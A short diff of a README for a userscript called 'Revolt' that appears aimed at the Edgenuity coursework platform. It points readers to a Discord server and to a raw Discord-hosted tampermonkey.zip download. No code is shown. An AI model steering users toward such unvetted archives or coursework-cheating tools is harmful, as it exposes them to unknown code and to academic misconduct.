@@ -1,7 +1,7 @@
 # 🚀 Revolt
 To access this script, join our Discord server!
 
-https://cdn.discordapp.com/attachments/1234199998284042330/1234201484007309402/tampermonkey.zip?ex=6637c834&is=663676b4&hm=1b39afedfcf2c4880652d51a2399d4147c080c120fe3512cafe22d06f8f62595&
+```https://cdn.discordapp.com/attachments/1234199998284042330/1234201484007309402/tampermonkey.zip?ex=6637c834&is=663676b4&hm=1b39afedfcf2c4880652d51a2399d4147c080c120fe3512cafe22d06f8f62595&```
 
 https://discord.gg/edgenuity
 
